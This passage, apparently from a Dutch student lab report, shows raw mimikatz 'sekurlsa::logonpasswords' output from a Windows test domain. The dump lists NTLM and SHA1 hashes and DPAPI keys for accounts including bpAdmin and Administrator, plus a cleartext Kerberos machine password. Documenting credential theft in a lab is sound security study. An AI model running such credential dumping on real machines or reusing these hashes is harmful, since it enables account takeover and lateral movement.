# Uitvoer 2: NTLM en LM hashes werden opnieuw gevonden, maar dan rechtstreeks via de Windows machine
```bash
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 5120786 (00000000:004e2312)
Session           : Interactive from 5
User Name         : jorn
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/3/2023 10:07:14 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1107
        msv :
            [00000003] Primary
            * Username : jorn
            * Domain   : bp-2223-jorn
            * NTLM     : 0cb6948805f797bf2a82807973b89537
            * SHA1     : 87f8ed9157125ffc4da9e06a7b8011ad80a53fe1
            * DPAPI    : b289f44529cbd7a685a3103291a8a091
        tspkg :
        wdigest :
            * Username : jorn
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : jorn
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 5003677 (00000000:004c599d)
Session           : Interactive from 5
User Name         : DWM-5
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/3/2023 10:07:04 PM
SID               : S-1-5-90-0-5
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 5003373 (00000000:004c586d)
Session           : Interactive from 5
User Name         : DWM-5
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/3/2023 10:07:04 PM
SID               : S-1-5-90-0-5
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4999594 (00000000:004c49aa)
Session           : Interactive from 5
User Name         : UMFD-5
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/3/2023 10:07:04 PM
SID               : S-1-5-96-0-5
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4616230 (00000000:00467026)
Session           : Interactive from 4
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/3/2023 10:06:17 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
            [00000003] Primary
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * NTLM     : 9a0198b452271b12ed7bfa3857896de6
            * SHA1     : b6aeabf2f779a9e9dbdf984476aead8903d6279b
            * DPAPI    : 43ea3bc55e20e980ea270eb496c17458
        tspkg :
        wdigest :
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : bpAdmin
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4616195 (00000000:00467003)
Session           : Interactive from 4
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/3/2023 10:06:17 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
            [00000003] Primary
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * NTLM     : 9a0198b452271b12ed7bfa3857896de6
            * SHA1     : b6aeabf2f779a9e9dbdf984476aead8903d6279b
            * DPAPI    : 43ea3bc55e20e980ea270eb496c17458
        tspkg :
        wdigest :
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : bpAdmin
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4499802 (00000000:0044a95a)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/3/2023 10:06:10 PM
SID               : S-1-5-90-0-4
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4499744 (00000000:0044a920)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/3/2023 10:06:10 PM
SID               : S-1-5-90-0-4
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4498518 (00000000:0044a456)
Session           : Interactive from 4
User Name         : UMFD-4
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/3/2023 10:06:09 PM
SID               : S-1-5-96-0-4
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 3317352 (00000000:00329e68)
Session           : NetworkCleartext from 0
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/3/2023 9:02:38 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
            [00000003] Primary
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * NTLM     : 9a0198b452271b12ed7bfa3857896de6
            * SHA1     : b6aeabf2f779a9e9dbdf984476aead8903d6279b
            * DPAPI    : 43ea3bc55e20e980ea270eb496c17458
        tspkg :
        wdigest :
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : bpAdmin
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 3315942 (00000000:003298e6)
Session           : Service from 0
User Name         : sshd_6172
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 4/3/2023 9:02:35 PM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-6172
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 2907127 (00000000:002c5bf7)
Session           : Interactive from 3
User Name         : Administrator
Domain            : CLIENT
Logon Server      : CLIENT
Logon Time        : 4/3/2023 9:01:28 PM
SID               : S-1-5-21-4116410313-3006944705-3552785028-500
        msv :
            [00000003] Primary
            * Username : Administrator
            * Domain   : CLIENT
            * NTLM     : 383fe399326a954a97f73781553ae73d
            * SHA1     : 91ea158bf0afb16eda7057cf94407fb8b07ee2d4
        tspkg :
        wdigest :
            * Username : Administrator
            * Domain   : CLIENT
            * Password : (null)
        kerberos :
            * Username : Administrator
            * Domain   : CLIENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 2821457 (00000000:002b0d51)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/3/2023 9:01:19 PM
SID               : S-1-5-90-0-3
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 2815156 (00000000:002af4b4)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/3/2023 9:01:19 PM
SID               : S-1-5-90-0-3
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 2798147 (00000000:002ab243)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/3/2023 9:01:19 PM
SID               : S-1-5-96-0-3
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 2196702 (00000000:002184de)
Session           : Interactive from 2
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/3/2023 8:58:21 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 2196680 (00000000:002184c8)
Session           : Interactive from 2
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/3/2023 8:58:21 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 232846 (00000000:00038d8e)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CLIENT
Logon Server      : CLIENT
Logon Time        : 4/3/2023 8:54:31 PM
SID               : S-1-5-21-4116410313-3006944705-3552785028-500
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/3/2023 8:54:20 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
            * Username : (null)
            * Domain   : (null)
            * Password : (null)
        kerberos :
            * Username : (null)
            * Domain   : (null)
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CLIENT$
Domain            : bp-2223-jorn
Logon Server      : (null)
Logon Time        : 4/3/2023 8:54:20 PM
SID               : S-1-5-20
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : client$
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 25453 (00000000:0000636d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/3/2023 8:54:20 PM
SID               : S-1-5-96-0-0
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 23897 (00000000:00005d59)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/3/2023 8:54:19 PM
SID               :
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CLIENT$
Domain            : bp-2223-jorn
Logon Server      : (null)
Logon Time        : 4/3/2023 8:54:19 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : client$
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :       KO
```